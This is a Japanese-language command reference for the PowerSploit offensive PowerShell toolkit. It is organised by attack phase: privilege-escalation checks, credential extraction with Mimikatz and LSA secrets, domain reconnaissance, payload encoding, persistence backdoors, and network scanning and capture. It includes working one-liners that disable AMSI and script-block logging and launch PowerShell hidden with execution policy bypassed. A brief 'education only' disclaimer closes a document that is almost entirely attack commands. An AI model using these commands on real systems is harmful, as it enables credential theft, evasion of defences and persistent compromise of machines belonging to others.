# PowerSploit Command Reference

## モジュールのインポート
```powershell
# モジュールのインポート
Import-Module PowerSploit

# 特定のモジュールのインポート
Import-Module .\PowerView.ps1
Import-Module .\PowerUp.ps1
Import-Module .\Invoke-Mimikatz.ps1
```

## 権限昇格
```powershell
# 権限昇格の脆弱性チェック
Invoke-AllChecks

# サービスの脆弱性チェック
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService

# 自動実行の脆弱性チェック
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
```

## パスワード抽出
```powershell
# 資格情報の抽出
Get-GPPPassword
Get-UnattendedInstallFile
Get-Keystrokes

# メモリからの資格情報抽出
Invoke-Mimikatz
Invoke-MimikatzWDigestDowngrade
```

## 情報収集
```powershell
# システム情報収集
Get-ComputerDetails
Get-LSASecret
Get-RegistryMountedDrive

# ネットワーク情報収集
Get-NetDomain
Get-NetUser
Get-NetComputer
Get-NetGroup
Get-NetFileServer
```

## 実行バイパス
```powershell
# 実行ポリシーのバイパス
PowerShell.exe -NoP -NonI -W Hidden -Exec Bypass

# AMSIバイパス
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# スクリプトブロックログのバイパス
$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
$settings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```

## ペイロード生成
```powershell
# PowerShellペイロードの生成
Out-EncodedCommand -ScriptBlock {commands}

# バイパスペイロードの生成
Out-CompressedDll -FilePath evil.dll
Out-EncryptedScript -ScriptPath script.ps1
```

## 持続性の確保
```powershell
# 永続化の設定
Install-ServiceBinary -Name "Service Name"
Add-ScrnSaveBackdoor
Add-Persistence

# スケジュールタスクの作成
Install-PowerShellTask
```

## ネットワーク操作
```powershell
# ポートスキャン
Invoke-PortScan -Hosts <target> -Ports "80,443,8080"

# パケットキャプチャ
Invoke-PoshPcap
Start-PacketCapture

# プロキシの設定
Set-ProxySettings
```

## 注意事項
- これらのツールは教育目的でのみ使用してください
- 実環境での使用は違法となる可能性があります
- アンチウイルスソフトに検知される可能性があります
- システムに重大な影響を与える可能性があるため、慎重に使用してください 